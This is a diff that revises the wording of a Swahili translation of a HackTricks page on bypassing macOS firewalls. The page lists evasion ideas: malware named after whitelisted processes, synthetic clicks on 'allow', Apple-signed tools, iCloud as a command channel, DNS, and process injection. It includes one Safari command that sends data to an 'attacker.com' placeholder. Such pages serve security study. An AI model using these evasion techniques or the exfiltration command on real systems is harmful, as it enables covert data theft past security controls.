@@ -20,23 +20,23 @@ Mbinu zifuatazo zilipatikana zikifanya kazi kwenye baadhi ya programu za firewal
 
 ### Kutumia majina ya orodha nyeupe vibaya
 
-* Kwa mfano kuita zisizo na programu na majina ya michakato inayojulikana vizuri ya macOS kama vile **`launchd`**
+* Kwa mfano kuita zisizo na programu hasidi majina ya michakato inayojulikana vizuri ya macOS kama vile **`launchd`**
 
 ### Bonyeza ya Kisynthetic
 
-* Ikiwa firewall inauliza idhini kwa mtumiaji, fanya zisizo bonyeza **ruhusu**
+* Ikiwa firewall inauliza idhini kwa mtumiaji, fanya zisizo na programu hasidi **bonyeza kwenye ruhusu**
 
-### **Tumia programu za Apple zilizosainiwa**
+### **Tumia programu zilizosainiwa na Apple**
 
-* Kama vile **`curl`**, lakini pia nyingine kama vile **`whois`**
+* Kama vile **`curl`**, lakini pia nyingine kama **`whois`**
 
-### Vipeni vya Apple vinavyojulikana
+### Vipeni vya Apple vilivyofahamika
 
-Firewall inaweza kuruhusu uhusiano kwenye vikoa vya Apple vinavyojulikana kama vile **`apple.com`** au **`icloud.com`**. Na iCloud inaweza kutumika kama C2.
+Firewall inaweza kuruhusu uhusiano kwenye vikoa vya Apple vilivyofahamika kama vile **`apple.com`** au **`icloud.com`**. Na iCloud inaweza kutumika kama C2.
 
 ### Kupitisha Kwa Ujumla
 
-Mawazo kadhaa ya kujaribu kupitisha firewalls
+Mawazo kadhaa kujaribu kupitisha firewalls
 
 ### Angalia trafiki iliyoruhusiwa
 
@@ -44,11 +44,11 @@ Kujua trafiki iliyoruhusiwa kutakusaidia kutambua vikoa vilivyowekwa kwenye orod
 ```bash
 lsof -i TCP -sTCP:ESTABLISHED
 ```
-### Kudhuru DNS
+### Kutumia DNS
 
 Ufumbuzi wa DNS unafanywa kupitia programu iliyosainiwa ya **`mdnsreponder`** ambayo labda itaruhusiwa kuwasiliana na seva za DNS.
 
-<figure><img src="../../.gitbook/assets/image (464).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>
 
 ### Kupitia Programu za Kivinjari
 
@@ -79,7 +79,7 @@ open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
 ```
 ### Kupitia sindano za michakato
 
-Ikiwa unaweza **kuingiza nambari ndani ya mchakato** ambao una ruhusa ya kuunganisha kwenye seva yoyote unaweza kukiuka ulinzi wa firewall:
+Ikiwa unaweza **kuingiza nambari ndani ya mchakato** ambao una ruhusa ya kuunganisha kwenye seva yoyote unaweza kudukua kinga ya firewall:
 
 {% content-ref url="macos-proces-abuse/" %}
 [macos-proces-abuse](macos-proces-abuse/)
@@ -91,7 +91,7 @@ Ikiwa unaweza **kuingiza nambari ndani ya mchakato** ambao una ruhusa ya kuungan
 
 <details>
 
-<summary><strong>Jifunze kuhusu kuvamia AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>
+<summary><strong>Jifunze kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>
 
 Njia nyingine za kusaidia HackTricks:
 
@@ -99,6 +99,6 @@ Njia nyingine za kusaidia HackTricks:
 * Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
 * Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
 * **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Shiriki mbinu zako za kuvamia kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
+* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
